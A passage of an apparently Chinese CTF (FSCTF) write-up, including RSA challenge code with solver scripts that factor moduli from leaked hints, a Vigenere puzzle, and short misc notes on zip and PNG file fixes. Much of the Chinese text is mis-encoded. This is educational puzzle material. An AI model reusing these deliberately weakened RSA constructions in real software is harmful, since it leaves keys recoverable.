PolynomialRing<span class=\"token punctuation\">(</span>ZZ<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>p <span class=\"token operator\">=</span> k<span class=\"token operator\">**</span><span class=\"token number\">6</span> <span class=\"token operator\">+</span> <span class=\"token number\">7</span><span class=\"token operator\">*</span>k<span class=\"token operator\">**</span><span class=\"token number\">4</span> <span class=\"token operator\">-</span> <span class=\"token number\">40</span><span class=\"token operator\">*</span>k<span class=\"token operator\">**</span><span class=\"token number\">3</span> <span class=\"token operator\">+</span> <span class=\"token number\">12</span><span class=\"token operator\">*</span>k<span class=\"token operator\">**</span><span class=\"token number\">2</span> <span class=\"token operator\">-</span> <span class=\"token number\">114</span><span class=\"token operator\">*</span>k <span class=\"token operator\">+</span> <span class=\"token number\">31377</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>q <span class=\"token operator\">=</span> k<span class=\"token operator\">**</span><span class=\"token number\">5</span> <span class=\"token operator\">-</span> <span class=\"token number\">8</span><span class=\"token operator\">*</span>k<span class=\"token operator\">**</span><span class=\"token number\">4</span> <span class=\"token operator\">+</span> <span class=\"token number\">19</span><span class=\"token operator\">*</span>k<span class=\"token operator\">**</span><span class=\"token number\">3</span> <span class=\"token operator\">-</span> <span class=\"token number\">313</span><span class=\"token operator\">*</span>k<span class=\"token operator\">**</span><span class=\"token number\">2</span> <span class=\"token operator\">-</span> <span class=\"token number\">14</span><span class=\"token operator\">*</span>k <span class=\"token operator\">+</span> <span class=\"token number\">14011</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>n0 <span class=\"token operator\">=</span> p <span class=\"token operator\">*</span> q</pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>f <span class=\"token operator\">=</span> n <span class=\"token operator\">-</span> n0</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>sol <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>roots<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\"># print(sol)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>x <span class=\"token operator\">=</span> sol<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>p <span class=\"token operator\">=</span> p<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>q <span class=\"token operator\">=</span> q<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>d <span class=\"token operator\">=</span> inverse_mod<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>enc<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"babyhint\"><a class=\"markdownIt-Anchor\" href=\"#babyhint\">#</a> babyhint</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> libnum</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> uuid</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">from</span> secret <span class=\"token keyword\">import</span> flag</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>m<span class=\"token operator\">=</span>libnum<span class=\"token punctuation\">.</span>s2n<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p<span class=\"token operator\">=</span>libnum<span class=\"token punctuation\">.</span>generate_prime<span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>q<span class=\"token operator\">=</span>libnum<span class=\"token punctuation\">.</span>generate_prime<span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>e<span class=\"token operator\">=</span><span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>n<span class=\"token operator\">=</span>p<span class=\"token operator\">*</span>q</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>hint1<span class=\"token operator\">=</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span><span class=\"token number\">2023</span><span class=\"token operator\">*</span>p<span class=\"token operator\">+</span><span class=\"token number\">2022</span><span class=\"token operator\">*</span>q<span class=\"token punctuation\">,</span><span class=\"token number\">1919</span><span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>hint2<span class=\"token operator\">=</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span><span class=\"token number\">2022</span><span class=\"token operator\">*</span>p<span class=\"token operator\">+</span><span class=\"token number\">2023</span><span class=\"token operator\">*</span>q<span class=\"token punctuation\">,</span><span class=\"token number\">9191</span><span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>c<span class=\"token operator\">=</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hint1=\"</span><span class=\"token punctuation\">,</span>hint1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hint2=\"</span><span class=\"token punctuation\">,</span>hint2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"n=\"</span><span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"c=\"</span><span class=\"token punctuation\">,</span>c<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>hint1= 83535799515204730191288403119559179388147974968301357768644756769205396635068662150926873512812305514469213626273460486537390422570056287512841114712846420160416446291128064734960979586229744062965998582728378025151822479630618024804808407804317029367335421715125562402059266983021662398390585435529976586654</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>hint2= 14402204438484882372730843813561914135941866642278909172674395293274736617425618184831446215507756031454895377588951726822765439585979555636320832177929472057402274116190878688601329765374509467243968967279090492272317903230101551317377700802837187081510381677262879617929177970455244249498674083943925477229</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>n= 94120719816617297967197808458007462810449143149204454740678593087096770130918870563878599847276923902207042790106345400843990455347835029220453217996810995363105274873857381469314548191574754245357568090646094043040797653858225598519876785530143007788084656262253002478643994943076851585839631209338814367691</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>c= 84244594789418833202484965138308516535996015903654462304986953156471594657993252593373963514364258027091543394305491354187806441313428473670956684437253991594327692679733432489342255718685303997647293213324463025120804679847465190496542879161344985402542539184706559207299026102682674060562738496314731555616</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>'''</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>h1<span class=\"token operator\">=</span> <span class=\"token number\">83535799515204730191288403119559179388147974968301357768644756769205396635068662150926873512812305514469213626273460486537390422570056287512841114712846420160416446291128064734960979586229744062965998582728378025151822479630618024804808407804317029367335421715125562402059266983021662398390585435529976586654</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>h2<span class=\"token operator\">=</span> <span class=\"token number\">14402204438484882372730843813561914135941866642278909172674395293274736617425618184831446215507756031454895377588951726822765439585979555636320832177929472057402274116190878688601329765374509467243968967279090492272317903230101551317377700802837187081510381677262879617929177970455244249498674083943925477229</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>n<span class=\"token operator\">=</span> <span class=\"token number\">94120719816617297967197808458007462810449143149204454740678593087096770130918870563878599847276923902207042790106345400843990455347835029220453217996810995363105274873857381469314548191574754245357568090646094043040797653858225598519876785530143007788084656262253002478643994943076851585839631209338814367691</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>c<span class=\"token operator\">=</span> <span class=\"token number\">84244594789418833202484965138308516535996015903654462304986953156471594657993252593373963514364258027091543394305491354187806441313428473670956684437253991594327692679733432489342255718685303997647293213324463025120804679847465190496542879161344985402542539184706559207299026102682674060562738496314731555616</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>e<span class=\"token operator\">=</span><span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> libnum</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>kq <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span><span class=\"token number\">2023</span><span class=\"token punctuation\">,</span><span class=\"token number\">1919</span><span class=\"token operator\">*</span><span class=\"token number\">9191</span><span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>h2<span class=\"token punctuation\">,</span><span class=\"token number\">1919</span><span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span><span class=\"token number\">2022</span><span class=\"token punctuation\">,</span><span class=\"token number\">1919</span><span class=\"token operator\">*</span><span class=\"token number\">9191</span><span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>h1<span class=\"token punctuation\">,</span><span class=\"token number\">9191</span><span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>q <span class=\"token operator\">=</span> libnum<span class=\"token punctuation\">.</span>gcd<span class=\"token punctuation\">(</span>kq<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>phi <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>n<span class=\"token operator\">//</span>q <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>d <span class=\"token operator\">=</span> libnum<span class=\"token punctuation\">.</span>invmod<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>phi<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>libnum<span class=\"token punctuation\">.</span>n2s<span class=\"token punctuation\">(</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"ezmath\"><a class=\"markdownIt-Anchor\" href=\"#ezmath\">#</a> ezmath</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> libnum</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> secret <span class=\"token keyword\">import</span> flag</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>m <span class=\"token operator\">=</span> libnum<span class=\"token punctuation\">.</span>s2n<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>q <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>n <span class=\"token operator\">=</span> p <span class=\"token operator\">*</span> q</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>hint <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span><span class=\"token number\">2022</span> <span class=\"token operator\">*</span> p <span class=\"token operator\">+</span> <span class=\"token number\">2023</span><span class=\"token punctuation\">,</span> q<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'n=</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>n<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'c=</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>c<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'hint=</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>hint<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>n=16099847254382387482323197733210572595987701766995679577427964142162383113660616883997429365200200943640950821711084123429306946305893862414506257284441114840863787499898478803568113348661314216300658606282276936902117099898776435948501831796770856505782683585268617613575681655903107683069260253287994894440427511440504754827820494060133773435262418256886443037510658584541624614692050308222516337333585823733360631982795323752298740497235142977602602205292595197618229629610834651923388269194546316023246525302500676142502931303976146680655368617094100097945625676103639154884247373003120937959132698199043562660573</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>c=7980021929208497878634194663038470941705554065040985666635317762877799614984808729636911256912639929083920319066806111423231500122646366713245534616522235309310234767331344216892929739448126523171652425415458999098138841038319673380331281114806318366697490343176758140150118761408250366783210772381316729932361601257318131085116265135718477224618689710966570938280408341402386000281564650565256635313406111364916715660419153433573586809503564050585204002594864254089288672391014804368427324162776953191520483774116807593366091685560902424782104761523067998300887293902330501335485075609216897135678017158187880996872</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>hint=14005608544369156893681352040163362072608754453657200460825561123439158535855236943525558717120672888372079069187756549797113560863313618058077150885401191613229507892570378437310964624470055767463556516869604496669085622244233154871165554916349033197798790982409986216498996673603605465039336316170130644317728786516639634775709400754328137266154981484016505702738584209800158047120647468364899692021253904198509376650238372552486792709682170146695759196408908825447960637667502907929061819408441663880712891979320089482801220225451560809151067631824526463122992973388740015878474372614751149918455457191739542980396</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>'''</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> libnum</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token number\">16099847254382387482323197733210572595987701766995679577427964142162383113660616883997429365200200943640950821711084123429306946305893862414506257284441114840863787499898478803568113348661314216300658606282276936902117099898776435948501831796770856505782683585268617613575681655903107683069260253287994894440427511440504754827820494060133773435262418256886443037510658584541624614692050308222516337333585823733360631982795323752298740497235142977602602205292595197618229629610834651923388269194546316023246525302500676142502931303976146680655368617094100097945625676103639154884247373003120937959132698199043562660573</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token number\">7980021929208497878634194663038470941705554065040985666635317762877799614984808729636911256912639929083920319066806111423231500122646366713245534616522235309310234767331344216892929739448126523171652425415458999098138841038319673380331281114806318366697490343176758140150118761408250366783210772381316729932361601257318131085116265135718477224618689710966570938280408341402386000281564650565256635313406111364916715660419153433573586809503564050585204002594864254089288672391014804368427324162776953191520483774116807593366091685560902424782104761523067998300887293902330501335485075609216897135678017158187880996872</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>h <span class=\"token operator\">=</span> <span class=\"token number\">14005608544369156893681352040163362072608754453657200460825561123439158535855236943525558717120672888372079069187756549797113560863313618058077150885401191613229507892570378437310964624470055767463556516869604496669085622244233154871165554916349033197798790982409986216498996673603605465039336316170130644317728786516639634775709400754328137266154981484016505702738584209800158047120647468364899692021253904198509376650238372552486792709682170146695759196408908825447960637667502907929061819408441663880712891979320089482801220225451560809151067631824526463122992973388740015878474372614751149918455457191739542980396</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>p <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>gcd<span class=\"token punctuation\">(</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span><span class=\"token number\">2023</span><span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span>h<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>q <span class=\"token operator\">=</span> n<span class=\"token operator\">//</span>p</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>phi <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>d <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>invert<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span> phi<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>libnum<span class=\"token punctuation\">.</span>n2s<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"ÂÖ≥ÈîÆÁöÑvigenere\"><a class=\"markdownIt-Anchor\" href=\"#ÂÖ≥ÈîÆÁöÑvigenere\">#</a> ÂÖ≥ÈîÆÁöÑ Vigenere</h3>\n<p py@nessfz_tzhozr!=\"\">È¢òÁõÆÔºöQGUMI</p>\n<p>key:\tFNY CQ HLQSEPNVJ<br>\n ÊèêÁ§∫ÔºöKeyword<br>\nÔºàËßÇÂÖ∂Ë°®ÔºåËß£ÂÖ∂ÈáåÔºâ</p>\n<p>ÂÖ≥ÈîÆÂ≠óËß£ÂØÜÔºöFNY CQ HLQSEPNVJ    key:Vigenere  &gt; KEY IS LOSTDREAM</p>\n<p yu@nsheng_qidong!=\"\">Áª¥ÂêâÂ∞º‰∫öËß£ÂØÜÔºöQGUMI {py@nessfz_tzhozr!}   key:LOSTDREAM  &gt; FSCTF</p>\n<h2 id=\"misc\"><a class=\"markdownIt-Anchor\" href=\"#misc\">#</a> misc</h2>\n<h3 id=\"simple-encryption\"><a class=\"markdownIt-Anchor\" href=\"#simple-encryption\">#</a> Simple Encryption</h3>\n<p>ÂéãÁº©ÂåÖ‰º™Âä†ÂØÜ„ÄÇÁõ¥Êé•‰øÆÊîπ deFlags 9 &gt; 0</p>\n<h3 id=\"ËêßÊ≤≥\"><a class=\"markdownIt-Anchor\" href=\"#ËêßÊ≤≥\">#</a> ËêßÊ≤≥</h3>\n<p>‰øÆÊîπ 16 ËøõÂà∂ÂéãÁº©ÂåÖÂ§¥ 89 50 4E 47</p>\n<p>‰øÆÊîπÂõæÁâáÈ´òÂ∫¶ÂæóÂà∞ flag</p>\n<h3 id=\"baseÂ•ó\"><a class=\"markdownIt-Anchor\" href=\"#baseÂ•ó\">#</a> base Â•ó</h3>\n<p>base64 Â•óÂ•ΩÂ§öÊ¨°ÈòøÔºÅÔºÅÔºÅ</p>\n<h3 id=\"Ë°å‰∏çË°åÂïäÁªÜÁãó\"><a class=\"markdownIt-Anchor\" href=\"#Ë°å‰∏çË°åÂïäÁªÜÁãó\">#</a> Ë°å‰∏çË°åÂïäÁªÜÁãó</h3>\n<p>‰øÆÊîπ docx ÊñáÊ°£ÔºåÂèØËÉΩÊòØÁ≥ªÁªüÈóÆÈ¢òÂêóÔºü</p>\n<pre><code>FSCTF&#123;N0t_A_heRo_\n‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°å